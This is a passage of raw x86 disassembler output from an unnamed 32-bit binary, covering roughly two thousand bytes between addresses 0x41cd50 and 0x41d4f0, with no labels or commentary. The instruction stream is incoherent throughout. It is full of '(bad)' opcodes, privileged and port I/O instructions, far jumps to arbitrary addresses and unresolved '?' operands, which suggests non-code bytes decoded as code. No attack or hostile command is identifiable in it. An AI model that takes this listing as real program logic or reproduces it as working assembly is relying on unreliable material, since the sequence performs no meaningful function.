  41cd50:	mov    BYTE PTR [esi+0xe],al
  41cd53:	(bad)  
  41cd54:	sub    eax,0x14755a19
  41cd59:	push   0x12
  41cd5b:	mov    al,0xd1
  41cd5d:	retf   0x41f9
  41cd60:	xchg   ebx,eax
  41cd61:	test   BYTE PTR [edx-0x4d6a69ff],bh
  41cd67:	repz into 
  41cd69:	fsub   DWORD PTR [esi]
  41cd6b:	sar    DWORD PTR ds:0x3b7ee0a3,cl
  41cd71:	push   ds
  41cd72:	xchg   edx,eax
  41cd73:	fsub   DWORD PTR [edx+0x38]
  41cd76:	add    BYTE PTR [ebx-0x9d60ca7],bh
  41cd7c:	aam    0xda
  41cd7e:	(bad)
  41cd83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd84:	mov    ch,0xa9
  41cd86:	cmp    al,0xff
  41cd88:	sub    DWORD PTR [esi+0x4fe1343a],edi
  41cd8e:	xchg   ebx,eax
  41cd8f:	xchg   edx,eax
  41cd90:	mul    BYTE PTR [eax]
  41cd92:	dec    ecx
  41cd93:	cmc    
  41cd94:	shl    edi,cl
  41cd96:	mov    esp,0x3601013e
  41cd9b:	dec    ebp
  41cd9c:	in     al,dx
  41cd9d:	or     BYTE PTR [ecx-0x7e],0x5a
  41cda1:	pop    esp
  41cda2:	mov    esi,0xdfc54a1
  41cda7:	cmc    
  41cda8:	sub    cl,BYTE PTR [eax+edx*2-0x23261eda]
  41cdaf:	dec    ebx
  41cdb0:	cmp    DWORD PTR [ecx],ebx
  41cdb2:	pop    ss
  41cdb3:	cmc    
  41cdb4:	fmul   DWORD PTR [ebp+0x47]
  41cdb7:	or     DWORD PTR [eax-0x4dbc3450],edi
  41cdbd:	in     eax,dx
  41cdbe:	jmp    0xe71:0xb187440b
  41cdc5:	aad    0x6f
  41cdc7:	mov    ds:0x6fd5e13b,eax
  41cdcc:	push   ds
  41cdcd:	(bad)  
  41cdce:	loopne 0x41ce46
  41cdd0:	add    eax,0xc2148e49
  41cdd5:	pop    ds
  41cdd6:	in     al,dx
  41cdd7:	adc    eax,0xcaa1f111
  41cddc:	test   DWORD PTR [edi],esp
  41cdde:	out    dx,al
  41cddf:	test   eax,0xdef9a619
  41cde4:	(bad)  
  41cde5:	loope  0x41cdb4
  41cde7:	lea    eax,[ebx+0x40]
  41cdea:	std    
  41cdeb:	mov    al,ds:0x6b97cfc2
  41cdf0:	jne    0x41ce4e
  41cdf2:	jb     0x41cdc4
  41cdf4:	adc    DWORD PTR [edi+ebx*4+0x3b],eax
  41cdf8:	dec    ebx
  41cdf9:	xchg   edx,eax
  41cdfa:	lock call 0xa9ff:0xf9230af8
  41ce02:	inc    ebx
  41ce03:	int    0xb0
  41ce05:	fisubr DWORD PTR [esi+0x6828ced1]
  41ce0b:	lds    esi,FWORD PTR [ebx+0xa]
  41ce0e:	fbstp  TBYTE PTR [edx-0x24]
  41ce11:	sbb    DWORD PTR [edi+0x72eebb37],ebp
  41ce17:	mov    ds:0xae410ea8,al
  41ce1c:	mov    eax,ds:0xcca42552
  41ce21:	and    DWORD PTR ds:0xdf9674cf,esi
  41ce27:	loopne 0x41ce86
  41ce29:	xchg   edx,eax
  41ce2a:	xor    edx,esi
  41ce2c:	pushf  
  41ce2d:	loope  0x41ce6d
  41ce2f:	sub    DWORD PTR [ecx+0x29],esp
  41ce32:	aam    0xf5
  41ce34:	sbb    ch,BYTE PTR [eax]
  41ce36:	ficomp WORD PTR ds:0xb68f303a
  41ce3c:	shl    BYTE PTR [esi-0x251d9d81],cl
  41ce42:	in     al,0x93
  41ce44:	lahf   
  41ce45:	ins    DWORD PTR es:[edi],dx
  41ce46:	in     eax,dx
  41ce47:	and    al,0xe9
  41ce49:	sar    BYTE PTR [edi],1
  41ce4b:	and    ah,BYTE PTR [ebp+0x32459f01]
  41ce51:	or     ah,BYTE PTR [ebp-0x3a]
  41ce54:	cmc    
  41ce55:	ficom  WORD PTR [eax+0x65]
  41ce58:	pop    ds
  41ce59:	or     eax,0x636fc5e9
  41ce5e:	mov    fs:0x2fa1b84d,eax
  41ce64:	retf   0x353b
  41ce67:	iret   
  41ce68:	(bad)  
  41ce69:	bound  ecx,QWORD PTR [eax]
  41ce6b:	aaa    
  41ce6c:	loopne 0x41ce80
  41ce6e:	into   
  41ce6f:	mov    cl,0x98
  41ce71:	ss cs hlt 
  41ce74:	sahf   
  41ce75:	out    dx,eax
  41ce76:	pop    edx
  41ce77:	xor    BYTE PTR [edx-0x76ae5977],bh
  41ce7d:	jae    0x41ceea
  41ce7f:	inc    edi
  41ce80:	pop    edi
  41ce81:	ret    0xff9b
  41ce84:	in     eax,0x1
  41ce86:	cvttps2pi mm5,QWORD PTR ds:0x79f38af1
  41ce8d:	jne    0x41ce63
  41ce8f:	and    eax,0xe29a990a
  41ce94:	out    0x92,al
  41ce96:	sub    bh,BYTE PTR [eax]
  41ce98:	out    dx,eax
  41ce99:	cmp    eax,0xa02d038e
  41ce9e:	xchg   esi,eax
  41ce9f:	int    0xaf
  41cea1:	xchg   ebx,eax
  41cea2:	imul   edi,esp,0x43
  41cea5:	(bad)  
  41cea6:	ds mov ebx,0xe5e4b655
  41ceac:	aaa    
  41cead:	pop    eax
  41ceae:	mov    edi,0xd27ab32a
  41ceb3:	scas   eax,DWORD PTR es:[edi]
  41ceb4:	in     eax,dx
  41ceb5:	cld    
  41ceb6:	repnz lods al,BYTE PTR ds:[esi]
  41ceb8:	ss inc ebx
  41ceba:	test   DWORD PTR [ecx+0x6b],0xfc213090
  41cec1:	push   eax
  41cec2:	scas   eax,DWORD PTR es:[edi]
  41cec3:	inc    ebp
  41cec4:	fist   DWORD PTR [ecx-0x8]
  41cec7:	and    eax,0xdb288d1a
  41cecc:	jno    0x41ce86
  41cece:	cmp    eax,0x33b9fd2
  41ced3:	imul   eax,DWORD PTR [ebp+0x1ad3f671],0xffffffce
  41ceda:	cmc    
  41cedb:	mov    cs,WORD PTR [edi+0x3f]
  41cede:	shl    DWORD PTR [edi-0x1d2b692a],cl
  41cee4:	inc    esp
  41cee5:	ja     0x41cf3c
  41cee7:	dec    eax
  41cee8:	sbb    DWORD PTR [ecx-0x3ce7ad9],ecx
  41ceee:	xchg   esp,eax
  41ceef:	mov    edx,0x23576179
  41cef4:	pop    edx
  41cef5:	neg    DWORD PTR [edx+0x62]
  41cef8:	sbb    BYTE PTR [ebx-0x40d95137],bl
  41cefe:	hlt    
  41ceff:	jne    0x41cf4a
  41cf01:	cmc    
  41cf02:	push   esp
  41cf03:	scas   eax,DWORD PTR es:[edi]
  41cf04:	inc    edx
  41cf05:	add    bh,BYTE PTR [ebp-0x6c]
  41cf08:	mov    ebx,0xd54bac7a
  41cf0d:	imul   esp,DWORD PTR [edi+edi*8-0x20ed8ed6],0xffffff88
  41cf15:	outs   dx,BYTE PTR ds:[esi]
  41cf16:	jo     0x41cf25
  41cf18:	mov    dl,0x2e
  41cf1a:	clc    
  41cf1b:	sti    
  41cf1c:	cld    
  41cf1d:	xchg   ecx,eax
  41cf1e:	xchg   edi,eax
  41cf1f:	and    dl,BYTE PTR [ebp-0x53be5000]
  41cf25:	into   
  41cf26:	xchg   edi,eax
  41cf27:	sub    ebp,DWORD PTR [edx-0x42998a5d]
  41cf2d:	(bad)  
  41cf2e:	pusha  
  41cf2f:	stc    
  41cf30:	jge    0x41cf98
  41cf32:	xor    DWORD PTR [edx+eiz*4+0x43a63d24],esp
  41cf39:	push   0x19
  41cf3b:	retf   
  41cf3c:	adc    BYTE PTR [eax+0x525a4a55],cl
  41cf42:	fdiv   DWORD PTR [ecx]
  41cf44:	sbb    edx,DWORD PTR fs:[eax-0x72]
  41cf48:	int    0x39
  41cf4a:	dec    eax
  41cf4b:	inc    edx
  41cf4c:	mov    ebp,0xf9037482
  41cf51:	pop    esp
  41cf52:	ss mov edx,0x69793765
  41cf58:	add    al,0x16
  41cf5a:	pop    ds
  41cf5b:	cmc    
  41cf5c:	outs   dx,DWORD PTR ds:[esi]
  41cf5d:	mov    ch,0xf4
  41cf5f:	push   0x4d
  41cf61:	bound  ebp,QWORD PTR [edx+0x7c]
  41cf64:	icebp  
  41cf65:	cmp    al,0x2a
  41cf67:	add    bl,dh
  41cf69:	(bad)  
  41cf6a:	cmp    ebp,ecx
  41cf6c:	(bad)  
  41cf6d:	nop
  41cf6e:	dec    ecx
  41cf6f:	cdq    
  41cf70:	nop
  41cf71:	loop   0x41cfdc
  41cf73:	and    eax,0xde562fda
  41cf78:	xchg   BYTE PTR [ebx],bh
  41cf7a:	icebp  
  41cf7b:	sbb    al,0x24
  41cf7d:	push   ds
  41cf7e:	stc    
  41cf7f:	inc    edx
  41cf80:	or     eax,0xee6f7586
  41cf85:	inc    eax
  41cf86:	arpl   WORD PTR [eax+eax*8],sp
  41cf89:	in     al,0x50
  41cf8b:	jp     0x41cffc
  41cf8d:	ror    DWORD PTR [ecx],1
  41cf8f:	pop    ecx
  41cf90:	push   esp
  41cf91:	push   0xffffff98
  41cf93:	ss mov bl,0xfa
  41cf96:	sub    eax,0x627c9d64
  41cf9b:	jb     0x41cfac
  41cf9d:	push   0x4f
  41cf9f:	fmul   DWORD PTR [ebp+ebx*2+0x5643e811]
  41cfa6:	into   
  41cfa7:	shr    esi,1
  41cfa9:	gs dec ax
  41cfac:	xlat   BYTE PTR ds:[ebx]
  41cfad:	dec    edi
  41cfae:	adc    cl,BYTE PTR [eax+0x1f6ab6d1]
  41cfb4:	je     0x41cfe0
  41cfb6:	rol    DWORD PTR [ecx],1
  41cfb8:	inc    esi
  41cfb9:	xchg   esp,eax
  41cfba:	sub    cl,BYTE PTR [esp+esi*8]
  41cfbd:	lahf   
  41cfbe:	addr16 pusha 
  41cfc0:	jg     0x41cf51
  41cfc2:	das    
  41cfc3:	sub    al,0x32
  41cfc5:	push   ecx
  41cfc6:	sbb    al,0x1d
  41cfc8:	pop    esp
  41cfc9:	mov    BYTE PTR [esi-0x64],0x92
  41cfcd:	jge    0x41cf67
  41cfcf:	and    eax,0xbb960c1
  41cfd4:	lods   al,BYTE PTR ds:[esi]
  41cfd5:	in     al,dx
  41cfd6:	add    BYTE PTR [bp+di+0x5],0x6c
  41cfdb:	fcomp  QWORD PTR [eax+0x7518823d]
  41cfe1:	jg     0x41cfc2
  41cfe3:	sub    ebx,edi
  41cfe5:	fnstenv [eax-0x46a2d035]
  41cfeb:	mov    ds:0xc5a65f47,al
  41cff0:	stos   DWORD PTR es:[edi],eax
  41cff1:	ja     0x41d057
  41cff3:	nop
  41cff4:	int    0xb
  41cff6:	fs test eax,0x743d6bc5
  41cffc:	jmp    0x35853d6a
  41d001:	dec    ebx
  41d002:	ins    BYTE PTR es:[edi],dx
  41d003:	jl     0x41d05a
  41d005:	outs   dx,BYTE PTR ds:[esi]
  41d006:	xor    eax,0x8665a33b
  41d00b:	push   ss
  41d00c:	sbb    BYTE PTR [ebx-0x17],dl
  41d00f:	adc    eax,0x9121e93
  41d014:	jp     0x41cfa3
  41d016:	xchg   BYTE PTR fs:[ecx+0x7b],dl
  41d01a:	inc    ecx
  41d01b:	sbb    DWORD PTR [ebx+ebp*1],esp
  41d01e:	inc    edi
  41d01f:	call   0x6c09:0x2989d47b
  41d026:	lahf   
  41d027:	xor    edi,0x32
  41d02a:	(bad)  
  41d02b:	(bad)  
  41d02d:	outs   dx,DWORD PTR ds:[esi]
  41d02e:	pop    edi
  41d02f:	es stc 
  41d031:	jbe    0x41cfb8
  41d033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d034:	pop    esp
  41d035:	fdecstp 
  41d037:	mov    cl,0x6b
  41d039:	ror    DWORD PTR [edi+0x7f],cl
  41d03c:	add    eax,0xbe1fde82
  41d041:	dec    eax
  41d042:	or     eax,0x177c7bd7
  41d047:	pop    ds
  41d048:	(bad)  
  41d049:	mov    cl,0x2d
  41d04b:	jo     0x41d0a9
  41d04d:	dec    eax
  41d04e:	sub    BYTE PTR [edi],0x51
  41d051:	repnz pop ecx
  41d053:	mov    ?,WORD PTR [edi+eiz*2]
  41d056:	dec    edi
  41d057:	push   edi
  41d058:	(bad)  
  41d05b:	jge    0x41d0c1
  41d05d:	adc    BYTE PTR [edx+eax*1],ch
  41d060:	xor    eax,0x74ced948
  41d065:	add    edx,DWORD PTR [ebx+ecx*4-0x9]
  41d069:	push   0xffffffc4
  41d06b:	mov    ds:0x6891b355,al
  41d070:	mov    ebp,0xce1ef31d
  41d075:	or     DWORD PTR [edi+ebx*2],edx
  41d078:	mov    ebx,0x689bf8c0
  41d07d:	inc    ebx
  41d07e:	(bad)  
  41d080:	dec    ebx
  41d081:	sbb    ecx,DWORD PTR [ebp+0x6dbc1352]
  41d087:	popf   
  41d088:	xchg   edi,eax
  41d089:	and    ch,ah
  41d08b:	pop    edx
  41d08c:	jae    0x41d0ea
  41d08e:	jle    0x41d095
  41d090:	mov    DWORD PTR [edx],esi
  41d092:	mov    al,ds:0xdd11916f
  41d097:	inc    esi
  41d098:	fsub   DWORD PTR [edi]
  41d09a:	fdiv   DWORD PTR [eax+0x66f12cc4]
  41d0a0:	ret    
  41d0a1:	test   DWORD PTR [ecx-0x3b469aa9],ecx
  41d0a7:	dec    ebx
  41d0a8:	fisttp DWORD PTR [ebx-0x64b00e18]
  41d0ae:	xlat   BYTE PTR ds:[ebx]
  41d0af:	retf   
  41d0b0:	mov    eax,0x75b38b15
  41d0b5:	push   edi
  41d0b6:	xchg   edi,eax
  41d0b7:	mov    cl,0x2c
  41d0b9:	cmp    eax,0x653815ab
  41d0be:	sub    al,0xfc
  41d0c0:	mov    ds:0x8f00d197,al
  41d0c5:	xor    ch,BYTE PTR [edx+0x7d01bcf8]
  41d0cb:	addr16 retf 0x1095
  41d0cf:	rcr    DWORD PTR [ebx],0xaf
  41d0d2:	inc    edi
  41d0d3:	lods   al,BYTE PTR ds:[esi]
  41d0d4:	fbstp  TBYTE PTR [ecx+0x21fb6c56]
  41d0da:	scas   eax,DWORD PTR es:[edi]
  41d0db:	repz add esi,DWORD PTR [ebp-0x1d2e45a7]
  41d0e2:	not    DWORD PTR [ebx+0x4ceb14d8]
  41d0e8:	mov    ds:0x525001c6,eax
  41d0ed:	cmp    cl,bh
  41d0ef:	cmp    ah,BYTE PTR [eax+0x6]
  41d0f2:	lea    eax,[edx-0x78938a1]
  41d0f8:	or     dh,BYTE PTR [edx-0x1533c671]
  41d0fe:	repz mov edx,0x606c75a4
  41d104:	in     eax,0x88
  41d106:	xor    edi,edi
  41d108:	pusha  
  41d109:	push   0x42e7c0c4
  41d10e:	jge    0x41d177
  41d110:	and    bh,bh
  41d112:	out    dx,al
  41d113:	sub    dh,BYTE PTR [edi+0x3ba664ba]
  41d119:	mov    WORD PTR [esp+ebp*2+0x79c1f93f],ds
  41d120:	stos   BYTE PTR es:[edi],al
  41d121:	xor    al,0x59
  41d123:	sahf   
  41d124:	mov    esi,0x8bf59c6b
  41d129:	sub    BYTE PTR [esi-0x155301f],0x7
  41d130:	inc    esp
  41d131:	and    esp,DWORD PTR [ebx-0x7b721199]
  41d137:	mov    eax,0x16fbb681
  41d13c:	cmp    esp,DWORD PTR [esi+0x1a]
  41d13f:	add    al,0x9b
  41d141:	push   cs
  41d142:	out    dx,al
  41d143:	push   edi
  41d144:	pop    esp
  41d145:	mov    esp,0x8037c12b
  41d14a:	cmp    esi,DWORD PTR [esi-0x43]
  41d14d:	inc    ebp
  41d14e:	jmp    0xe1e397cd
  41d153:	add    esi,edi
  41d155:	push   ss
  41d156:	call   0x457f:0x49263286
  41d15d:	lds    ecx,FWORD PTR [ebx]
  41d15f:	xor    DWORD PTR [edi-0x1bc94c02],ebx
  41d165:	call   0xd4a37a0d
  41d16a:	or     DWORD PTR [edi-0x29],edi
  41d16d:	xor    DWORD PTR [ecx+0x4f8d5a0],edx
  41d173:	pop    ds
  41d174:	or     al,0xf7
  41d176:	inc    edi
  41d177:	jbe    0x41d12e
  41d179:	adc    dl,BYTE PTR ds:0x2a80db9c
  41d17f:	or     eax,eax
  41d181:	fist   DWORD PTR [edx]
  41d183:	mov    ds:0xee063e05,eax
  41d188:	fnsave [eax-0x4f]
  41d18b:	ins    DWORD PTR es:[edi],dx
  41d18c:	fs xchg edi,eax
  41d18e:	loop   0x41d190
  41d190:	setp   BYTE PTR [ecx+0x1f56ca56]
  41d197:	push   eax
  41d198:	sbb    al,0x81
  41d19a:	mov    ebx,0x8d9d32d6
  41d19f:	pop    ebx
  41d1a0:	aam    0x14
  41d1a2:	iretw  
  41d1a4:	pop    ecx
  41d1a5:	push   ebx
  41d1a6:	add    ebx,DWORD PTR [ebx]
  41d1a8:	push   ebx
  41d1a9:	jne    0x41d15d
  41d1ab:	dec    esp
  41d1ac:	mov    ds:0xdef8d82c,eax
  41d1b1:	enter  0x64ea,0x98
  41d1b5:	adc    DWORD PTR [ebx-0x6a],0x4e2dcf05
  41d1bc:	retf   0x6112
  41d1bf:	add    al,0xb3
  41d1c1:	les    edi,FWORD PTR [edx+0x7a8945fa]
  41d1c7:	mov    ebx,DWORD PTR [edx]
  41d1c9:	in     eax,dx
  41d1ca:	mov    bh,0x9d
  41d1cc:	in     al,dx
  41d1cd:	pop    edx
  41d1ce:	jo     0x41d21f
  41d1d0:	imul   edi,eax,0xb
  41d1d3:	mov    ecx,0x903c7f28
  41d1d8:	ins    DWORD PTR es:[edi],dx
  41d1d9:	inc    esi
  41d1da:	sbb    DWORD PTR [ebp+0x198ee87e],eax
  41d1e0:	int3   
  41d1e1:	sbb    BYTE PTR [ebx+0x49],bl
  41d1e4:	and    DWORD PTR [ecx-0x77b1b5ca],esi
  41d1ea:	push   eax
  41d1eb:	or     DWORD PTR [esi+ebx*4],0xffffffb9
  41d1ef:	mov    fs,WORD PTR [ebp-0x63f334a1]
  41d1f5:	adc    al,0x66
  41d1f7:	dec    ecx
  41d1f8:	out    0xb4,eax
  41d1fa:	sbb    BYTE PTR [edi-0x6a614215],ah
  41d200:	mov    eax,ds:0xf1c0a6bf
  41d205:	sbb    DWORD PTR [edx+0x30467516],0xffffff84
  41d20c:	pop    edi
  41d20d:	fs inc edx
  41d20f:	push   edi
  41d210:	test   ch,dh
  41d212:	out    0x8d,al
  41d214:	jg     0x41d20b
  41d216:	test   dh,0x34
  41d219:	dec    eax
  41d21b:	dec    eax
  41d21c:	call   0x4f446a
  41d221:	clc    
  41d222:	sub    ebp,DWORD PTR [edx+ebx*2]
  41d225:	xchg   ecx,eax
  41d226:	(bad)  [eax]
  41d228:	sahf   
  41d229:	inc    eax
  41d22a:	adc    eax,0xa81fae96
  41d22f:	sbb    al,0xf2
  41d231:	adc    cl,al
  41d233:	push   0x34fb2e5a
  41d238:	cld    
  41d239:	(bad)  
  41d23a:	out    0xbe,al
  41d23c:	mov    dh,0x42
  41d23e:	ins    DWORD PTR es:[edi],dx
  41d23f:	pop    esi
  41d240:	cli    
  41d241:	dec    esi
  41d242:	mov    bl,0xfa
  41d244:	xor    al,0x19
  41d246:	add    al,0xf
  41d248:	pop    ebx
  41d249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d24a:	mov    DWORD PTR [edx],ebp
  41d24c:	dec    ebp
  41d24d:	div    dh
  41d24f:	out    0xd4,al
  41d251:	push   ebx
  41d252:	lods   al,BYTE PTR ds:[esi]
  41d253:	scas   al,BYTE PTR es:[edi]
  41d254:	push   edi
  41d255:	ret    0x5d29
  41d258:	cmp    eax,DWORD PTR [esi+0x515689ca]
  41d25e:	jecxz  0x41d298
  41d260:	inc    edx
  41d261:	xor    esi,DWORD PTR [edx+0x20d4135]
  41d267:	add    eax,ebx
  41d269:	add    eax,0x6b9460c2
  41d26e:	sub    DWORD PTR [esi],ecx
  41d270:	rcr    BYTE PTR [ebx+0x57],cl
  41d273:	(bad)  
  41d274:	call   0x76b00da0
  41d279:	cmp    edx,DWORD PTR [eax]
  41d27b:	push   es
  41d27c:	xlat   BYTE PTR ds:[ebx]
  41d27d:	ror    ecx,1
  41d27f:	setnp  ah
  41d282:	dec    esi
  41d283:	rol    ebp,1
  41d285:	sbb    eax,0x5cff9903
  41d28a:	xchg   edx,eax
  41d28b:	mov    bh,BYTE PTR ds:[edi+eiz*1-0x75]
  41d290:	pop    esi
  41d291:	xchg   edx,eax
  41d292:	mov    bh,ch
  41d294:	add    eax,0x73516429
  41d299:	jns    0x41d2c5
  41d29b:	ins    BYTE PTR es:[edi],dx
  41d29c:	fcmove st,st(0)
  41d29e:	out    0x5,al
  41d2a0:	scas   al,BYTE PTR es:[edi]
  41d2a1:	mov    cl,0x60
  41d2a3:	shr    DWORD PTR [edx-0x236e33b7],1
  41d2a9:	add    al,0xf8
  41d2ab:	mov    edi,0x37c250f0
  41d2b0:	dec    eax
  41d2b1:	xchg   esi,eax
  41d2b2:	and    DWORD PTR [ebx+0x46],ebx
  41d2b5:	or     eax,DWORD PTR [ecx]
  41d2b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2b8:	pop    ebx
  41d2b9:	or     cl,BYTE PTR [ebp+0x2490752b]
  41d2bf:	inc    esp
  41d2c0:	pushf  
  41d2c1:	(bad)  
  41d2c2:	ror    BYTE PTR [esi-0x3299b76],0x8
  41d2c9:	into   
  41d2ca:	cwde   
  41d2cb:	fsubr  DWORD PTR [ecx]
  41d2cd:	cli    
  41d2ce:	sbb    BYTE PTR ds:0xf7e27d3a,dh
  41d2d4:	leave  
  41d2d5:	adc    edi,DWORD PTR [edx]
  41d2d7:	popf   
  41d2d8:	aas    
  41d2d9:	xchg   edi,eax
  41d2da:	pop    edi
  41d2db:	stc    
  41d2dc:	popf   
  41d2dd:	ds inc ecx
  41d2df:	xor    eax,0xca288491
  41d2e4:	bound  edi,QWORD PTR [edx+edi*8+0x5]
  41d2e8:	push   ecx
  41d2e9:	(bad)  
  41d2ea:	scas   eax,DWORD PTR es:[edi]
  41d2eb:	stos   DWORD PTR es:[edi],eax
  41d2ec:	cmp    dl,BYTE PTR [edx+0x332b68e0]
  41d2f2:	test   DWORD PTR [eax+0x4f252d4b],edx
  41d2f8:	mov    al,0xd9
  41d2fa:	aam    0x30
  41d2fc:	retw   
  41d2fe:	xor    BYTE PTR [ecx+ebx*2-0x67],bl
  41d302:	dec    esp
  41d303:	in     al,dx
  41d304:	jae    0x41d34f
  41d306:	out    dx,eax
  41d307:	in     al,0xdf
  41d309:	or     BYTE PTR ds:0x48ea3cf2,bl
  41d30f:	outs   dx,DWORD PTR ds:[esi]
  41d310:	aaa    
  41d311:	mov    bh,0x98
  41d313:	test   BYTE PTR [ebp+0x33347542],cl
  41d319:	pop    ebp
  41d31a:	cmp    BYTE PTR [ebp-0x4967f286],dh
  41d320:	mov    ch,0xb9
  41d322:	push   esp
  41d323:	push   edi
  41d324:	pop    edx
  41d325:	out    dx,al
  41d326:	into   
  41d327:	xchg   esi,eax
  41d328:	inc    esp
  41d329:	call   0x2d1c:0x40ccb193
  41d330:	iret   
  41d331:	loop   0x41d2cd
  41d333:	jns    0x41d33e
  41d335:	sbb    DWORD PTR [ecx],edi
  41d337:	addr16 or eax,0xa8c8c4bf
  41d33d:	mov    esp,0xff3a26dc
  41d342:	in     eax,dx
  41d343:	cmp    BYTE PTR [ebx+0xbf4e8f7],ah
  41d349:	pop    edi
  41d34a:	fsub   st,st(4)
  41d34c:	push   0xcb72a7d1
  41d351:	jge    0x41d31a
  41d353:	and    al,0x2a
  41d355:	out    dx,eax
  41d356:	cmp    edi,esp
  41d358:	jl     0x41d350
  41d35a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d35b:	xchg   DWORD PTR [ebp-0x7e05c380],edx
  41d361:	les    esp,FWORD PTR [esi]
  41d363:	xor    esp,DWORD PTR [eax+0x79f6680b]
  41d369:	adc    eax,DWORD PTR [esi-0x56]
  41d36c:	sub    bh,cl
  41d36e:	push   ecx
  41d36f:	pusha  
  41d370:	jne    0x41d343
  41d372:	cli    
  41d373:	jo     0x41d36e
  41d375:	mov    cl,0xf
  41d377:	popa   
  41d378:	or     bl,ah
  41d37a:	mov    WORD PTR [ebx+0x7fe88d23],?
  41d380:	js     0x41d345
  41d382:	or     esi,DWORD PTR [esi]
  41d384:	test   DWORD PTR [esi-0x67df524a],eax
  41d38a:	xor    DWORD PTR [esi-0x1f7cdd90],esi
  41d390:	nop
  41d391:	xchg   ebx,eax
  41d392:	push   esi
  41d393:	mov    ah,0x6b
  41d395:	xchg   DWORD PTR ss:[edi],ecx
  41d398:	in     al,dx
  41d399:	inc    esi
  41d39a:	dec    edx
  41d39b:	lods   eax,DWORD PTR ds:[esi]
  41d39c:	sbb    eax,0x3d29b40b
  41d3a1:	frstor [ebp+0x4e88fb42]
  41d3a8:	in     eax,dx
  41d3a9:	(bad)  
  41d3ab:	sub    al,0x29
  41d3ad:	sub    bh,bl
  41d3af:	dec    edx
  41d3b0:	mov    cl,0xa7
  41d3b2:	lods   al,BYTE PTR ds:[esi]
  41d3b3:	mov    ch,0x81
  41d3b5:	retf   0xd14
  41d3b8:	sub    al,0x6d
  41d3ba:	jge    0x41d413
  41d3bc:	xchg   ebx,eax
  41d3bd:	sub    al,0xd9
  41d3bf:	xor    al,0x2f
  41d3c1:	add    BYTE PTR [edi],cl
  41d3c3:	lock jmp 0xa2cb70c3
  41d3c9:	add    DWORD PTR [esi-0x1],0x2c
  41d3cd:	and    bl,0x36
  41d3d0:	mov    ebx,0xa2684121
  41d3d5:	and    al,0x94
  41d3d7:	mov    dl,0x1f
  41d3d9:	(bad)  
  41d3da:	fdiv   QWORD PTR [esp+eax*1]
  41d3dd:	in     al,dx
  41d3de:	outs   dx,BYTE PTR ds:[esi]
  41d3df:	lods   al,BYTE PTR ds:[esi]
  41d3e0:	mov    ah,0x30
  41d3e2:	add    dh,BYTE PTR [ebx-0x1716eac1]
  41d3e8:	mov    al,0x5d
  41d3ea:	inc    edx
  41d3eb:	pop    ds
  41d3ec:	sar    BYTE PTR [ebp+0xa00dbf0],0x0
  41d3f3:	ss sti 
  41d3f5:	test   BYTE PTR [esp+ebx*4],bl
  41d3f8:	push   esi
  41d3f9:	fs xchg esp,eax
  41d3fb:	inc    ebx
  41d3fc:	add    eax,0x7105404c
  41d401:	sbb    DWORD PTR [ebx],eax
  41d403:	inc    ecx
  41d404:	icebp  
  41d405:	daa    
  41d406:	cs test ebx,0x19b64d52
  41d40d:	and    ecx,DWORD PTR [eax]
  41d40f:	call   0x43cd:0x5a649550
  41d416:	in     eax,0x25
  41d418:	pop    eax
  41d419:	xor    DWORD PTR [edi],esi
  41d41b:	xor    bl,BYTE PTR [edx]
  41d41d:	js     0x41d3eb
  41d41f:	(bad)  
  41d420:	dec    esp
  41d421:	inc    ebp
  41d422:	mov    ebx,0xdf4ca9e5
  41d427:	xchg   ebp,eax
  41d428:	js     0x41d400
  41d42a:	cs and eax,0xbd3013fb
  41d430:	stos   DWORD PTR es:[edi],eax
  41d431:	push   es
  41d432:	push   ss
  41d433:	ds (bad) 
  41d435:	sar    BYTE PTR [ecx+0x3217371d],cl
  41d43b:	lds    esp,FWORD PTR [ecx-0x2d]
  41d43e:	add    al,0x9b
  41d440:	xor    esi,ecx
  41d442:	imul   eax,DWORD PTR [eax-0x2e],0x6bb6e8df
  41d449:	lock pop ebp
  41d44b:	mov    bl,0x7c
  41d44d:	xchg   esi,eax
  41d44e:	pop    ebp
  41d44f:	in     al,0x4d
  41d451:	dec    edi
  41d452:	inc    BYTE PTR [ecx+0x3daee023]
  41d458:	jmp    0xab55c988
  41d45d:	test   al,0xad
  41d45f:	mov    ecx,0x210ad3
  41d464:	sbb    eax,0x4d42bf10
  41d469:	bound  eax,QWORD PTR [ebp+0x45]
  41d46c:	push   ebx
  41d46d:	cwde   
  41d46e:	fwait
  41d46f:	mov    cl,0xd1
  41d471:	fadd   QWORD PTR [eax-0x4e46b685]
  41d477:	jns    0x41d4b3
  41d479:	sahf   
  41d47a:	lods   al,BYTE PTR ds:[esi]
  41d47b:	(bad)  
  41d47c:	sahf   
  41d47d:	xchg   esp,eax
  41d47e:	lods   eax,DWORD PTR ds:[esi]
  41d47f:	dec    ebp
  41d480:	push   eax
  41d481:	sub    DWORD PTR ds:0x7f12836e,edx
  41d487:	xchg   BYTE PTR ds:[ebx+0x37d97173],ch
  41d48e:	fild   QWORD PTR [eax+0x7d9ce5f7]
  41d494:	rol    DWORD PTR [eax+esi*4+0x76597fb],0x66
  41d49c:	xor    eax,0xa9d0e836
  41d4a1:	xchg   ecx,eax
  41d4a2:	jbe    0x41d50a
  41d4a4:	popf   
  41d4a5:	mov    eax,0x4b1befc9
  41d4aa:	adc    al,0x91
  41d4ac:	mov    esi,0x75429c4a
  41d4b1:	dec    DWORD PTR [eax]
  41d4b3:	sub    BYTE PTR [eax+0x20],ah
  41d4b6:	cs ja  0x41d46a
  41d4b9:	inc    eax
  41d4ba:	cmp    eax,0x5681328
  41d4bf:	out    dx,al
  41d4c0:	inc    ebx
  41d4c1:	inc    ebp
  41d4c2:	sub    dh,0xb2
  41d4c5:	dec    edi
  41d4c6:	add    BYTE PTR [ebx+ebp*8+0x44],0xee
  41d4cb:	popa   
  41d4cc:	ret    
  41d4cd:	daa    
  41d4ce:	sbb    eax,0x117cfd82
  41d4d3:	dec    edi
  41d4d4:	(bad)  
  41d4d5:	cmp    ebx,DWORD PTR [edi+0x45567f7]
  41d4db:	mov    al,ds:0x1000de3d
  41d4e0:	repz sti 
  41d4e2:	popf   
  41d4e3:	sbb    al,0xb1
  41d4e5:	mov    ds:0xc2ee1ff5,eax
  41d4ea:	and    ebp,ecx
  41d4ec:	jnp    0x41d4fd
  41d4ee:	loopne 0x41d516
  41d4f0:	outs   dx,BYTE PTR ds:[esi]
